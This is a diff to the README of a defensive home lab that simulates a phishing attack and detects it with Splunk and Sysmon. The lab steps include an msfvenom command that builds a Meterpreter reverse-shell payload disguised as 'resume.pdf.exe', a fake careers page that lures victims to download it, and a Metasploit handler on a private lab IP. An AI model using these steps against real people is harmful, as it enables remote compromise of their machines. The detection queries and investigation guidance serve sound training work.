@@ -66,30 +66,27 @@ This lab simulates a phishing attack where a user on a Windows 10 machine opens 
 
    **Minimal `inputs.conf`**:
    
+   ```
    [WinEventLog://Security]
-   
    index = endpoint
-   
    disabled = 0
    
    [WinEventLog://Application]
-   
    index = endpoint
-   
    disabled = 0
 
    [WinEventLog://Microsoft-Windows-Sysmon/Operational]
-   
    index = endpoint
-   
    disabled = 0
+   ```
 
 7. Restart Splunk (`splunk restart` or restart Splunkd service).
 8. Validate ingestion:
 
+   ```
    index=endpoint earliest=-15m
    | stats count by sourcetype
-
+   ```
    You should see at least:
    - `WinEventLog:Security`
    - `WinEventLog:Application`
@@ -98,57 +95,60 @@ This lab simulates a phishing attack where a user on a Windows 10 machine opens 
 ### 3. Attacker Setup on Kali
 
 1. Generate payload:
-    msfvenom -p windows/x64/meterpreter/reverse_#tcp LHOST=192.168.56.11 LPORT=4444 -f exe -o resume.pdf.exe
+   - `msfvenom -p windows/x64/meterpreter/reverse_#tcp LHOST=192.168.56.11 LPORT=4444 -f exe -o resume.pdf.exe`
 
 2. Create a simple fake careers page (`index.html`) in the same folder:
-   <!DOCTYPE html> <html> <head> <title>Careers - Application Portal</title> </head> <body> <h2>Thank you for applying</h2> <p>Please download the attached resume for          review:</p> <a href="resume.pdf.exe">Download candidate resume (PDF)</a> </body> </html> ```
+   <!DOCTYPE html> <html> <head> <title>Careers - Application Portal</title> </head> <body> <h2>Thank you for applying</h2> <p>Please download the attached resume for          review:</p> <a href="resume.pdf.exe">Download candidate resume (PDF)</a> </body> </html>
 
 3. Start HTTP server:
-   python3 -m http.server 8888
+   `python3 -m http.server 8888`
    
 4. Start Metasploit handler:
-   msfconsole
+```
+msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.56.11
 set LPORT 4444
 exploit
+```
 
 ### 4. Simulated Phishing Execution
 On the Windows VM:
 1. Browse to http://192.168.56.11:8888.
 2. Download resume.pdf.exe from the fake careers page.
 3. Temporarily disable Windows Defender real-time protection.
-4. Double-click resume.pdf.exe to execute.
+4. Double-click `resume.pdf.exe` to execute.
 5. (Optional) Confirm reverse shell in Metasploit on Kali.
 
 ### Detection Logic
-Full queries are in SPL/queries.md. Key examples:
+Full queries are in *`SPL/queries.md.`* Key examples:
 
 **1. Confirm logging**
 
-- `index=endpoint earliest=-15m`
-
-  `| stats count by sourcetype`
-
+```
+index=endpoint earliest=-15m
+| stats count by sourcetype
+```
 **2. Detect specific malicious attachment**
 
-- `index=endpoint earliest=-7d`
-
-  `| search "resume.pdf.exe"`
+```
+index=endpoint earliest=-7d
+| search "resume.pdf.exe"
+```
 
 **3. Detect EXEs executed from user profile folders**
-
-- `index=endpoint earliest=-7d`
-
-  `| search Image="*\\Users\\*\\Downloads\\*.exe" OR Image="*\\Users\\*\\Desktop\\*.exe"`
+```
+index=endpoint earliest=-7d
+| search Image="*\\Users\\*\\Downloads\\*.exe" OR Image="*\\Users\\*\\Desktop\\*.exe"
+```
 
 **4. Detect outbound connection to attacker C2**
 
-- `index=endpoint earliest=-7d`
-
-  `| search "192.168.56.11" "4444"`
-
+```
+index=endpoint earliest=-7d
+| search "192.168.56.11" "4444"
+```
 ### Investigation Steps
 
 When an alert/detection fires:
@@ -162,12 +162,32 @@ Search:
 Look at:
 
    - Image (full path)
-
    - ParentImage (who launched it, e.g., explorer.exe)
-
    - User (account that executed it)
-
    - CommandLine
 
-2. 
+**2. Review related network activity**
+
+- Correlate with possible C2 connections:
+```
+index=endpoint earliest=-30m
+| search "192.168.56.11" OR "4444"
+```
+- Confirm:
+
+  - Source IP: `192.168.56.10 (victim)`
+
+  - Destination IP: `192.168.56.11 (attacker)`
+
+  - Destination port: `4444`
+
+**3. Check for additional behavior**
+
+- Use filters on Sysmon data to look for:
+
+  - Suspicious child processes (e.g., `cmd.exe`, `powershell.exe` spawned by `resume.pdf.exe`)
+
+  - Persistence mechanisms or file modifications (if available in your `Sysmon config`)
+
+
 
